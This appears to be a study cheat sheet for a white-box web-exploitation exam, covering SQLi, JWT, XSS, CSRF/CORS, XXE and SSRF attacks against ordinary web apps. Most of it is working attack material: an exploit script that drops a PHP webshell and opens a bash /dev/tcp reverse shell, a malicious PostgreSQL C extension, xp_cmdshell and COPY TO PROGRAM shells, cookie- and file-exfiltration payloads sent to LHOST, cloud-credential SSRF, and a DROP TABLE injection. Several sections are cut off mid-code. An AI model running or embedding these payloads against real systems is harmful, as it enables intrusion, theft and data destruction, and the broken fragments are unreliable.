1. Tools & Setup

This is a white-box exam: you receive the application source code and must produce a working, automated exploit for each target. The toolchain centers on Burp Suite Pro for traffic inspection, Python for scripted exploitation, a per-language IDE/debugger for stepping through source, and decompilers for closed binaries.

1.1 Lab Environment

Build one project folder per target with the source tree, your exploit script, captured Burp requests, and notes. Use a requests.Session() across the chain so cookies and tokens propagate automatically. Disable TLS verification (s.verify = False) since exam labs use self-signed certs.

1.2 Exploit Script Skeleton

Every exam exploit follows the same shape: a Session, one function per stage of the chain (auth bypass → primitive → RCE trigger), arguments at the top for retargeting, and a main that runs them in order.

#!/usr/bin/env python3
"""Exploit - target: <app>  chain: SQLi auth bypass -> RCE"""
import requests, sys, re, argparse

TARGET  = "http://192.168.X.Y"
LHOST   = "10.10.10.10"
LPORT   = 443

s = requests.Session()
s.verify = False   # self-signed certs on exam targets

# Step 1 - Auth bypass / get session
def login_bypass():
    r = s.post(f"{TARGET}/login", data={"user": "admin'--", "pass": "x"})
    assert "dashboard" in r.text, "login bypass failed"
    print("[+] authenticated")

# Step 2 - SQLi to read/write a file / call a stored proc
def sqli_write_webshell():
    payload = "'; COPY (SELECT '<?php system($_GET[\"c\"]);?>') TO '/var/www/html/s.php';--"
    r = s.post(f"{TARGET}/api/search", json={"q": payload})
    assert r.status_code != 500, "SQLi failed"
    print("[+] webshell dropped")

# Step 3 - Execute reverse shell
def trigger_rce():
    cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    r = s.get(f"{TARGET}/s.php", params={"c": cmd})
    print("[+] reverse shell triggered")

if __name__ == "__main__":
    login_bypass()
    sqli_write_webshell()
    trigger_rce()

2. Source Code Review Methodology

White-box review starts at the entry points (routes/controllers that accept input) and follows tainted data downstream. Any user input that reaches a dangerous sink without sanitization is a vulnerability.

2.1 Review Approach

Map the attack surface first: enumerate every route, controller, and API endpoint (grep for @app.route, app.get|post, XML servlet mappings, controller annotations). Note which require auth and which don’t. Then concentrate on pre-auth entry points — login, password reset, registration, public APIs, static handlers, anything that runs before the auth middleware — and trace tainted parameters from each into queries, deserializers, eval, file ops, and template engines. The exam-winning chain is usually pre-auth SQLi that writes a file, pre-auth SSRF that fetches a URL, or stored XSS that steals an admin token to reach an authenticated RCE endpoint.

2.2 HTTP Routing Patterns

Find every endpoint before you read any sinks. Each framework expresses routes differently, so know the patterns and grep accordingly.

3. Authentication Bypass

Auth bypass is the first move in almost every white-box chain. It comes from logic flaws, type confusion, JWT weaknesses, or injection in the login/reset path — rarely from guessing credentials.

3.1 SQL Injection Auth Bypass

When a login query is string-concatenated, inject a comment that makes the WHERE clause always true, or inject a valid second user. White-box is a gift: read the exact query and craft the precise payload that satisfies its column types and quoting.

-- Classic (MySQL, MSSQL, SQLite, PostgreSQL)
username: admin'--
username: admin'#           -- MySQL comment variant
username: ' OR '1'='1       -- if the query wraps value in quotes
username: ' OR 1=1--
password field only: ' OR 1=1--

-- Second-user injection (terminate the username string, comment-eat the password check)
username: validuser'/*
password: */OR'1'='1

-- Bypass hash comparison (SQLi in password field when hash is compared in PHP)
password: ' OR password LIKE '%

3.2 Type Confusion & PHP Loose Comparisons

PHP’s == compares "0e12345…" against "0e99999…" as floats and finds them equal — the “magic hash” trick. JSON deserialization can also slip an integer where a string is expected, which loose comparison treats as equal.

// Vulnerable: if ($hash == $input_hash)
// PHP ==  compares "0e12345..." == "0e99999..." as floats -> TRUE
// Submit any value whose MD5/SHA1 starts with "0e" followed only by digits.
// Known magic hashes: MD5("240610708") = "0e462097431906509019562988736854"

// Type juggling via JSON
// POST body: {"user": 0, "pass": "anything"}  -> PHP 0 == "admin" is TRUE (loose ==)
// Fix uses === or password_verify(); white-box you see which.

3.3 JWT Attacks

Decode every JWT first — the header reveals the algorithm. Try algorithm confusion (RS256→HS256 with the public key as the HMAC secret), the alg: none attack, and a brute-force of the HS256 secret against rockyou.

# Decode a JWT (no verification)
jwt_tool "eyJ..." -d

# Algorithm confusion: change "RS256" to "HS256", sign with the RSA public key as HMAC secret
jwt_tool "eyJ..." -X a -pk public.pem

# "alg: none" attack: strip the signature and set alg to none
jwt_tool "eyJ..." -X n

# Brute-force weak HS256 secret
jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt

# Forge a new payload once secret or key confusion is found
jwt_tool "eyJ..." -T    # interactive tamper mode

3.4 Password Reset Logic Flaws

The reset flow is a common pre-auth path to admin. Look for predictable tokens (timestamp- or sequence-derived — the openCRX chapter shows this), missing invalidation after use, host-header injection that builds the reset URL from Host, HTTP parameter pollution that splits recipient and reset target, and timing differences that enable account enumeration.

# openCRX-style: token derived from a seeded PRNG using the current timestamp.
# Step 1: request a reset for a known account and capture the reset timestamp.
# Step 2: predict the PRNG state for a window of seeds around that timestamp.
# Step 3: generate every candidate token and try them against the reset endpoint.

import random, time, requests
TARGET = "http://target/reset"
now = int(time.time())
for seed in range(now - 5, now + 5):
    random.seed(seed)
    token = "".join(random.choice("0123456789abcdef") for _ in range(32))
    r = requests.get(f"{TARGET}?token={token}", allow_redirects=False)
    if r.status_code == 200:
        print(f"[+] token: {token}")
        break

# Host header injection: change Host to your server; user clicks the emailed link
# -> their browser sends the token to your server.
# Burp: tamper Host: attacker.com on the /forgot-password request.
# Parameter pollution: email=victim@corp.com&email=attacker@evil.com
# Some frameworks pick the first for the mail recipient, the last for the reset DB write.

4. SQL Injection → RCE

The course’s ManageEngine and ERPNext chapters both go from SQLi to RCE. The dominant techniques are file writes (INTO OUTFILE, COPY TO, large objects), stored procedures (xp_cmdshell), and PostgreSQL extensions / UDFs.

4.1 Enumeration & Fingerprinting

The first injection always identifies the DBMS — error messages, comment syntax, and version functions all give it away. White-box you already know from the source; confirm at runtime anyway, because exam targets sometimes proxy through ORMs that change escaping.

-- Database fingerprint via version
SELECT @@version             -- MySQL / MSSQL
SELECT version()             -- PostgreSQL
SELECT banner FROM v$version -- Oracle

-- Error-based (MySQL): force a type conversion error that leaks data
SELECT extractvalue(1,concat(0x7e,(SELECT version())))
-- MSSQL: CONVERT error
SELECT CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))

4.2 File Read / Write via SQLi

Each DBMS exposes its own file-write primitive. MySQL has INTO OUTFILE; PostgreSQL has COPY … TO and large objects (lo_export); MSSQL has xp_cmdshell. Targets often disable the obvious path — have the fallback ready.

-- MySQL: read a file (FILE privilege required)
SELECT LOAD_FILE('/etc/passwd')
-- MySQL: write a webshell (secure_file_priv must be unset or point to web root)
SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php system($_GET["c"]);?>' INTO DUMPFILE '/var/www/html/shell.php'

-- PostgreSQL: write via COPY (the ManageEngine course chain)
COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php'
-- PostgreSQL: large object (lo_export) for arbitrary binary write
SELECT lo_from_bytea(0, '\\x3c3f706870...') -- hex-encoded payload
SELECT lo_export(oid, '/var/www/html/shell.php') FROM pg_largeobject_metadata WHERE ...

-- MSSQL: xp_cmdshell (if enabled or if you can enable it)
EXEC master..xp_cmdshell 'powershell -enc ...'
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

4.3 PostgreSQL UDF / Extension RCE

When file write is blocked but you have superuser, build a malicious C extension with system() inside and load it via CREATE EXTENSION. The ManageEngine chapter walks this end-to-end — compile the extension to .so, host it on your server, load it remotely, and call the new function.

// rce_ext.c - PostgreSQL extension that runs an OS command
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>
PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(rce);
Datum rce(PG_FUNCTION_ARGS) {
    char *cmd = text_to_cstring(PG_GETARG_TEXT_PP(0));
    system(cmd);
    PG_RETURN_VOID();
}
# Build for the target PG version
gcc -I"$(pg_config --includedir-server)" -fPIC -shared rce_ext.c -o rce_ext.so
# Host on attacker
python3 -m http.server 80
-- Load it via SQLi (PostgreSQL >= 9.1)
CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;
SELECT rce('bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"');

-- Or PL/pgSQL function calling COPY TO PROGRAM (PG >= 9.3)
CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS void AS $$
BEGIN EXECUTE 'COPY (SELECT '''') TO PROGRAM ' || quote_literal(cmd); END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT exec('bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"');

4.4 Stacked Queries & Stored Procedures

When the driver allows stacked queries (mysqli_multi_query, PDO with PG/MSSQL), you can append a second statement that creates a function, enables a config, or directly executes a command via the database’s built-ins.

-- MySQL stacked queries (mysqli_multi_query or some PDO configs)
'; DROP TABLE users;--
'; INSERT INTO admins(user,pass) VALUES('hax','hax');--

-- MSSQL: enable xp_cmdshell via stacked queries
'; EXEC sp_configure ''show advanced options'',1;RECONFIGURE;
   EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;
   EXEC xp_cmdshell ''whoami'';--

4.5 Blind / Time-Based SQLi

When the query is in code and you can’t see results, automate a character-by-character extraction with a time-based oracle. Pick a sleep function per DBMS: MySQL SLEEP, PostgreSQL pg_sleep, MSSQL WAITFOR DELAY.

import requests, string, time

TARGET = "http://10.10.10.10/search"
CHARS  = string.printable
secret = ""

for pos in range(1, 50):
    for c in CHARS:
        # MySQL time-based: if the char matches, sleep 2 seconds
        payload = f"' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{c}',SLEEP(2),0)--"
        t0 = time.time()
        requests.get(TARGET, params={"q": payload})
        if time.time() - t0 > 1.5:
            secret += c
            print(f"\r[+] {secret}", end="", flush=True)
            break
print()
# For PostgreSQL: pg_sleep(2); for MSSQL: WAITFOR DELAY '0:0:2'

5. Cross-Site Scripting → Account Takeover

The chains here rarely care about alert(1). Stored or DOM-based XSS is used to fetch the admin’s CSRF token and exfiltrate data, create a backdoor account, or trigger an authenticated RCE endpoint.

5.1 Finding & Confirming XSS

Send a canary and grep the response for it unescaped. Different contexts demand different breakouts: closing a quoted attribute, escaping a <script> block, or hopping out of a JS string literal. A polyglot probes several at once.

# Basic reflection canary - look for it unescaped in the response
curl -s "http://target/search?q=xsscanary123" | grep xsscanary123

# Context probing: if inside an attribute, inject closing quote then event handler
# value="USER_INPUT" --> value="" onfocus="alert(1)" autofocus="
# Inside a <script> block: USER_INPUT --> ";alert(1)//

# Polyglot to probe multiple contexts at once
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

5.2 DOM-Based XSS

DOM XSS lives entirely in client-side JavaScript — the server never sees the payload. Sources include location.hash, location.search, document.referrer, window.name; sinks include innerHTML, document.write, eval, and setTimeout(string). The openITCOCKPIT chapter chains a DOM XSS through a websocket client.

// Vulnerable DOM pattern (sink: innerHTML; source: location.hash)
document.getElementById("greeting").innerHTML = location.hash.slice(1);
// Payload: http://target/page#<img src=x onerror=alert(1)>

// Common DOM sinks (grep for them in the bundled JS)
innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln,
eval, Function, setTimeout("...", N), setInterval("...", N),
location, location.href, location.assign, location.replace

5.3 Session Cookie / Token Exfiltration

If cookies lack HttpOnly, classic exfil works. Otherwise pivot — read the CSRF token from a page reachable with the victim’s session, and chain into a state-changing request.

// Classic cookie exfil (HttpOnly=false required)
<script>fetch("http://LHOST/x?c="+document.cookie)</script>
<img src=x onerror="this.src='http://LHOST/?c='+document.cookie">

// Fetch API - works across modern browsers, handles redirects
<script>fetch("http://LHOST/?c="+btoa(document.cookie))</script>

5.4 XSS to CSRF Chain (Admin Action)

Read the admin’s page (which carries their cookies via credentials:"include"), extract the CSRF token from it, then POST a privileged action with the matching token.

// Steal CSRF token from admin's page, then POST a state-changing request
fetch("/admin/settings", {credentials:"include"})
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf[_-]token.*?value="([^"]+)"/i)[1];
    return fetch("/admin/adduser", {
      method:"POST",
      credentials:"include",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:`csrf=${token}&user=hax&pass=hax&role=admin`
    });
  })

5.5 Stored XSS → Persistent Admin Backdoor

Find a field stored and later rendered to an admin (support tickets, profiles, comments, filenames). The payload waits for the admin’s browser to render it, then creates a new admin account or fetches an authenticated RCE endpoint.

// Stored XSS that creates a backdoor admin via a fetch chain
<script>

5.6 Persisting XSS Loot via IndexedDB / WebSockets

The openITCOCKPIT advanced-XSS chapter persists scraped admin data into the victim’s browser IndexedDB and exfiltrates it back over a websocket. Useful when you need to capture data across page loads, or when the admin’s page navigates away before exfil completes.

// Open / create a database, store loot, then exfiltrate later
const req = indexedDB.open("loot", 1);
req.onupgradeneeded = e => e.target.result.createObjectStore("d", {autoIncrement: true});
req.onsuccess = e => {
  const tx = e.target.result.transaction("d", "readwrite");
  tx.objectStore("d").add({ url: location.href, body: document.body.innerHTML });
};

// Later: read it back and stream over a WebSocket to the attacker
const ws = new WebSocket("ws://LHOST/loot");
ws.onopen = () => {
  const tx = db.transaction("d", "readonly");
  tx.objectStore("d").openCursor().onsuccess = e => {
    const c = e.target.result;
    if (c) { ws.send(JSON.stringify(c.value)); c.continue(); }
  };
};

6. CSRF, CORS & SameSite Bypass

A canonical chain here combines CSRF + permissive CORS into a pre-auth account takeover. The pieces — Same-Origin Policy, CORS, and SameSite cookies — need to be reasoned about together.

6.1 Same-Origin Policy (SOP)

SOP prevents scripts on origin A from reading responses from origin B. “Origin” = scheme + host + port. SOP does not block requests being sent (CSRF still works); it blocks reading the response. Anything that bypasses or relaxes SOP — CORS misconfig, postMessage misuse, JSONP — can flip a CSRF into a full read-and-write attack.

6.2 CORS Misconfiguration

The server can opt to allow cross-origin reads via Access-Control-Allow-Origin. Misconfigurations to look for: reflecting the request Origin verbatim, allowing null, allowing subdomain wildcards (a compromised subdomain abuses the parent), and shipping Access-Control-Allow-Credentials: true alongside a permissive origin (allows reading the response with cookies).

# Probe for an origin-reflecting CORS policy
curl -i -H "Origin: http://evil.com" http://target/api/profile
# If the response includes:
#   Access-Control-Allow-Origin: http://evil.com
#   Access-Control-Allow-Credentials: true
# any attacker page can read /api/profile with the victim's cookies attached.

# Other misconfigs to test
curl -i -H "Origin: null" http://target/api/profile   # sandboxed iframes / data: URIs
curl -i -H "Origin: http://target.evil.com" http://target/api/profile  # subdomain wildcard

6.3 SameSite Cookies

SameSite controls whether cookies travel cross-site. Strict strips them on any cross-site request; Lax sends them on top-level GET navigations only; None always sends them (requires Secure). On modern browsers cookies default to Lax — so a classic POST CSRF doesn’t carry the session cookie. Bypasses: top-level GET navigations still send Lax cookies; brand-new cookies (< 2 minutes old) bypass Lax in Chrome (the “Lax+POST” mitigation); cross-site requests from a same-site subdomain carry cookies normally.

6.4 Classic CSRF Exploitation

Auto-submit a form from the attacker page; the victim’s browser attaches their cookies (subject to SameSite). For JSON endpoints, build the form to encode as JSON or use fetch + a CORS-friendly content type. Pair with a permissive CORS policy to read the response.

<!-- Classic auto-submitting form CSRF (works without CSRF token validation) -->
<html><body onload="f.submit()">
  <form id=f action="http://target/admin/adduser" method=POST>
    <input name=user value=hax>
    <input name=pass value=hax>
    <input name=role value=Administrator>
  </form>
</body></html>

<!-- JSON CSRF: use a form with text/plain content type, body shaped like JSON -->
<form action="http://target/api/user" method=POST enctype="text/plain">
  <input name='{"user":"hax","pass":"hax","ignore":"' value='"}'>
</form>

6.5 CORS + CSRF Exploitation (Concord-Style)

Permissive CORS turns CSRF from “send-only” into a full read-and-write primitive: read the CSRF token from a page, then post with it. The Concord chapter exploits this against an unauthenticated endpoint plus an insecure default to take over the admin account.

// Hosted on attacker page. Victim visits while authenticated to target.
// 1. fetch reads the response thanks to permissive CORS
// 2. parse the CSRF token from the HTML
// 3. POST the privileged action with the matching token
fetch("http://target/admin", {credentials:"include"})
  .then(r => r.text())
  .then(h => {
    const t = /name="csrf" value="([^"]+)"/.exec(h)[1];
    return fetch("http://target/admin/users", {
      method: "POST", credentials: "include",
      headers: {"Content-Type":"application/x-www-form-urlencoded"},
      body: "csrf=" + t + "&user=hax&pass=Pwned1!&role=admin"
    });
  })
  .then(r => r.text())
  .then(t => fetch("http://LHOST/?d=" + btoa(t)));

7. Server-Side Template Injection (SSTI)

The ERPNext chapter chains a pre-auth SQLi to a Jinja2 SSTI. SSTI shows up wherever a template engine renders untrusted data — render functions, error pages that template the message, mailers that interpolate user input.

7.1 Detection

8. XML External Entity (XXE)

The openCRX chapter uses XXE as the first primitive: an XML parser that resolves external entities lets you read local files, scan internal services, and (via parameter entities) achieve out-of-band exfiltration even when the response is blind.

8.1 XML Entities & Vulnerable Parsers

An XML parser that resolves DTDs is exploitable when attacker XML reaches it. Java’s default DocumentBuilderFactory, .NET’s XmlDocument pre-4.5.2, and many PHP libxml uses are insecure unless explicitly hardened. Look for SOAP endpoints, SAML responses, document parsers (DOCX/XLSX which are zipped XML), and image processors (SVG).

8.2 Blind / OOB XXE with Parameter Entities

When the response doesn’t echo the entity, use parameter entities in an external DTD to assemble a URL containing the leaked data and force the parser to fetch it from your server — the file content lands in your HTTP log.

<!-- Step 1: send this payload to the target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://LHOST/evil.dtd">
  %ext;
]>
<foo>1</foo>
<!-- Step 2: host this at http://LHOST/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://LHOST/?d=%file;'>">
%wrap;
%send;
<!-- The parser fetches evil.dtd, reads /etc/passwd into %file;,

If the leaked file has XML metacharacters, the entity expansion will break parsing. Wrap the file content in CDATA via concatenated parameter entities — the openCRX chapter walks this trick.

10. Server-Side Request Forgery (SSRF)

import requests, time
def probe(host, port):
    t0 = time.time()
    try:
        requests.post(SSRF, json={"url": f"http://{host}:{port}"}, timeout=5)
    except requests.Timeout:
        return time.time() - t0
    return time.time() - t0

for ip in [f"10.0.0.{i}" for i in range(1, 255)]:

        dt = probe(ip, p)
        if dt > 1.5:    # slow response -> likely open
            print(f"[+] {ip}:{p} - {dt:.1f}s")

11.1 Concept

JavaScript’s prototype chain means every object inherits from Object.prototype. If attacker input reaches obj[key] = value where key can be __proto__ or constructor.prototype, the attacker adds properties to every object in the process — including config defaults, template options, and middleware behavior.

// Vulnerable recursive merge

}
// Attacker payload: {"__proto__": {"isAdmin": true}}
// After merge: ({}).isAdmin === true  (every object "is admin")

15. Methodology

Operator-checklist methodology for white-box web application testing. Each phase walks a vulnerability class end-to-end: identify the sink, trace the taint, confirm exploitability, chain to RCE or account takeover, write the exploit script.

15.1 Source Code Review

Map the application before hunting bugs. Understand routes, sinks, and data flow first — the rest of the methodology depends on this phase.

15.1.1 Route & Endpoint Mapping

  • Enumerate every route the application exposes:
    • Flask / Django: grep -rn "@app.route\|@blueprint.route\|path(" src/
    • Express: grep -rn "app.get\|app.post\|app.put\|app.delete\|router." src/
    • Spring: grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src/
    • PHP: grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|Route::" src/
    • .NET: grep -rn "\[HttpGet\|\[HttpPost\|\[Route" src/

15.2 Authentication Bypass

Test every authentication mechanism for logic flaws before moving to injection-based attacks.

15.2.1 SQL Injection Auth Bypass

  • Test the login form with classic SQLi payloads:
    • Username field: admin'--, admin'#, ' OR '1'='1
    • Password field: ' OR 1=1--, ' OR 1=1#
    • Both fields: admin' AND 1=1-- (confirm boolean blind)
  • Test for second-order SQLi in registration / profile update:
    • Register with a username containing SQL metacharacters
    • Trigger the injection when the stored value is used in a later query
  • Check for NoSQL injection on MongoDB backends:
    • JSON body: {{"user": {{"$ne": ""}}, "pass": {{"$ne": ""}}}}
    • Query string: user[$ne]=&pass[$ne]=

References: PortSwigger SQLi · PayloadsAllTheThings SQLi

15.2.2 Type Juggling & Magic Hashes

  • Test PHP loose comparison (==) bypasses:
    • Send integer 0 where string is expected: 0 == "admin" evaluates to TRUE in PHP
    • JSON content type allows type control: {{"user": 0, "pass": "anything"}}
  • Test magic hash collisions:
    • MD5 of 240610708 = 0e462097431906509019562988736854 — evaluates to 0 in loose comparison
    • SHA1 of 10932435112 = 0e07766915004133176347055865026311692244
    • If the app compares hashes with == instead of ===, supply a magic-hash input
  • Test array parameter injection:
    • Send pass[]=&pass[]= to make strcmp() return NULL (treated as 0 / equal)
    • Works when backend uses strcmp() or strcasecmp() without strict type checks

15.2.3 JWT Attacks

  • Decode and inspect the JWT structure:
    • jwt_tool "eyJ..." -d — decode header, payload, signature
    • Check alg field: RS256, HS256, none
    • Check claims: sub, role, exp, iss
  • Test algorithm confusion (RS256 → HS256):
    • jwt_tool "eyJ..." -X a -pk public.pem — sign with public key as HMAC secret
    • Requires the server’s public key (often in /.well-known/jwks.json)
  • Test none algorithm:
    • jwt_tool "eyJ..." -X n — strip signature, set alg to none
  • Brute-force weak HMAC secrets:
    • jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt
    • If cracked, forge tokens with arbitrary claims
# JWT attack commands
jwt_tool "eyJ..." -d                                    # Decode header + payload + signature

jwt_tool "eyJ..." -X n                                  # None algorithm — strip signature
jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt  # Brute-force HMAC secret

  • Tamper claims and re-sign:
    • jwt_tool "eyJ..." -T — interactive tamper mode
    • Change sub to admin, change role to administrator
    • Change exp to a future timestamp for expired-token bypass

15.2.4 Password Reset Flaws

  • Test for predictable reset tokens:
    • Request multiple resets, compare tokens for sequential / timestamp-based patterns
    • Brute-force short tokens if the keyspace is small
  • Test Host header injection:
    • Set Host: evil.com in the reset request
    • If the reset email contains Host-derived URL, token leaks to attacker
    • Also try X-Forwarded-Host: evil.com and X-Original-URL
  • Test parameter pollution:
    • Add duplicate email: email=victim@x.com&email=attacker@x.com
    • Some frameworks use the last value; the reset token may be sent to both

15.3 SQL Injection to RCE

Once SQLi is confirmed, escalate from data extraction to OS-level code execution.

15.3.1 Database Fingerprinting

  • Identify the database engine:
    • MySQL / MSSQL: SELECT @@version
    • PostgreSQL: SELECT version()
    • Oracle: SELECT banner FROM v$version
    • SQLite: SELECT sqlite_version()
  • Error-based fingerprinting when output is hidden:
    • MySQL: extractvalue(1, concat(0x7e, version()))
    • MSSQL: CONVERT(int, @@version) triggers type conversion error with version string
    • PostgreSQL: CAST(version() AS int)
  • Enumerate databases, tables, columns:
    • MySQL: SELECT schema_name FROM information_schema.schemata
    • Tables: SELECT table_name FROM information_schema.tables WHERE table_schema='target'
    • Columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'

15.3.2 File Write to Webshell

  • MySQL file write (requires FILE privilege):
    • SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'
    • Check privilege: SELECT file_priv FROM mysql.user WHERE user=current_user()
    • Check secure_file_priv variable — must be empty or writable web path
  • PostgreSQL file write via COPY:
    • COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php'
    • Requires superuser or pg_write_server_files role
  • PostgreSQL large objects for binary file writes:
    • SELECT lo_from_bytea(0, '\\x3c3f706870...') — create large object from hex payload
    • SELECT lo_export(OID, '/var/www/html/shell.php') — export to filesystem
    • Clean up: SELECT lo_unlink(OID)

  • MSSQL xp_cmdshell:
    • Enable: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

    • Reverse shell: EXEC xp_cmdshell 'powershell -enc [base64]'

15.3.4 Blind Data Extraction

  • Time-based blind injection:
    • MySQL: IF(SUBSTRING(user(),1,1)='r', SLEEP(2), 0)
    • PostgreSQL: SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN pg_sleep(2) ELSE pg_sleep(0) END
    • MSSQL: IF (SUBSTRING(system_user,1,1)='s') WAITFOR DELAY '0:0:2'
  • Boolean-based blind injection:
    • Compare response length / content for TRUE vs FALSE conditions
    • MySQL: AND SUBSTRING(user(),1,1)='r'
    • Automate with binary search over ASCII values
  • Script the extraction in Python:
    • Use requests.Session() with a timing loop
    • Extract one character at a time, measure response time
    • Build the full string character by character
    • Consider sqlmap -u "http://target/?id=1" --os-shell for automation

extracted = ""

15.4 Cross-Site Scripting to Account Takeover

Find a reflection or stored injection point, escalate to session hijacking or admin-action forgery.

15.4.1 Reflection Discovery

  • Inject a unique canary string in every input:
    • curl -s "http://target/search?q=xsscanary123" | grep xsscanary123
    • Check query parameters, POST body fields, headers (Referer, User-Agent), URL path segments
    • Note the context: inside HTML tag, inside attribute, inside <script> block, inside comment
  • Determine the rendering context:
    • HTML context: inject <img src=x onerror=alert(1)>
    • Attribute context: break out with " onmouseover="alert(1)
    • JavaScript context: break string with ';alert(1)//
    • URL context: javascript:alert(1)
  • Check for DOM-based XSS separately:
    • Dangerous sinks: innerHTML, outerHTML, document.write, eval, setTimeout
    • Sources: location.hash, location.search, document.referrer, window.name

15.4.2 Payload Crafting

  • Start with a polyglot that works in multiple contexts:
    • jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//
  • Try alternate event handlers if common ones are filtered:
    • <svg/onload=alert(1)>
    • <details open ontoggle=alert(1)>
    • <img src=x onerror=alert(1)>
    • <body onresize=alert(1)>
  • Bypass filters with encoding:
    • HTML entities: &lt;img src=x onerror=alert(1)&gt;
    • JavaScript hex: \\x3cscript\\x3ealert(1)\\x3c/script\\x3e
    • Template literals: ${{alert(1)}}
    • Unicode escapes: \\u0061lert(1)

  • Exfiltrate cookies via fetch:
    • <script>fetch("http://LHOST/x?c="+document.cookie)</script>

15.6 XML External Entity Injection

Any endpoint that parses XML (file uploads, SOAP, SVG, DOCX) is a candidate. Test for file read first, then escalate.

15.6.1 Basic XXE

  • Test for classic file read:
    • <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
    • Inject the entity reference where output is reflected in the response
  • Read source code with PHP wrappers:
    • <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">
    • Decode the base64 to read the full source including <?php tags
  • Test for SSRF via XXE:
    • <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    • <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"> (internal Redis)

<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

15.6.2 Blind / OOB XXE

  • When output is not reflected, use OOB exfiltration:
    • External DTD: <!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://LHOST/evil.dtd">%ext;]>
  • Craft the exfiltration DTD on your server:
    • evil.dtd: <!ENTITY % file SYSTEM "file:///etc/passwd">
    • Then: <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://LHOST/?d=%file;'>">%eval;%exfil;
    • Host at python3 -m http.server 80 and watch the incoming request

  • CDATA trick for files containing XML metacharacters:
    • Wrap the file content in CDATA sections via parameter entity chaining
    • Required when the target file contains <, >, or &

15.6.3 XXE to RCE

  • PHP expect wrapper (if enabled):
    • <!ENTITY xxe SYSTEM "expect://id"> — direct command execution
    • Rare in modern installs but check phpinfo() for expect extension
  • Chain XXE → SSRF → internal service exploitation:
    • Read cloud metadata IAM credentials via XXE SSRF
    • Hit internal admin panels or APIs that trust localhost
    • Exploit internal services with known vulnerabilities (Redis, Consul)
  • File write via XXE (rare):
    • Some parsers allow SYSTEM entity with file:// write semantics
    • More common: use the file-read to find credentials, then use those for RCE

15.8 Server-Side Request Forgery

Any feature that fetches a URL (webhooks, PDF generators, image importers, URL previews) is an SSRF candidate.

15.8.1 Target Discovery

  • Probe cloud metadata endpoints:
    • AWS: url=http://169.254.169.254/latest/meta-data/
    • GCP: url=http://metadata.google.internal/computeMetadata/v1/ with header Metadata-Flavor: Google
    • Azure: url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 with header Metadata: true
  • Scan internal services via SSRF:
    • Common targets: Redis (6379), Consul (8500), Docker API (2375), Elasticsearch (9200)
    • Internal admin panels: http://127.0.0.1:8080/admin
    • Other hosts on the same subnet
  • Blind SSRF detection via timing:
    • Compare response times: accessible port vs closed port vs filtered port
    • Python script to iterate ports and measure response delays

15.8.2 Filter Bypass

  • IP address obfuscation:
    • Octal: 0177.0.0.1 = 127.0.0.1
    • Decimal: 2130706433 = 127.0.0.1
    • Hex: 0x7f000001 = 127.0.0.1
    • IPv6: [::1] or [0:0:0:0:0:ffff:127.0.0.1]
  • DNS rebinding:
    • 127.0.0.1.nip.io resolves to 127.0.0.1
    • 127-0-0-1.sslip.io resolves to 127.0.0.1
    • Custom DNS server that alternates between public and internal IPs
  • URL parsing tricks:
    • Credential section: http://evil.com@127.0.0.1/
    • Fragment: http://127.0.0.1#@evil.com
    • Backslash: http://evil.com\\@127.0.0.1
    • Double encoding: http://127.0.0.1%252f..%252f

15.8.3 Protocol Smuggling

  • Gopher protocol for arbitrary TCP:
    • gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20"payload"%0d%0a...
    • Use Gopher to send raw Redis, SMTP, or MySQL commands
    • URL-encode each line with %0d%0a for CRLF

    • Inject HTML: <script>fetch("file:///etc/passwd").then(r=>r.text()).then(t=>fetch("http://LHOST/?"+btoa(t)))</script>
    • PDF generators that render user-controlled HTML are prime targets
    • Also try: <iframe src="file:///etc/passwd">
  • HTTP verb tampering for bypasses:
    • for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do curl -X $V ...; done
    • Some SSRF filters only check GET requests

15.9 Prototype Pollution (Node.js)

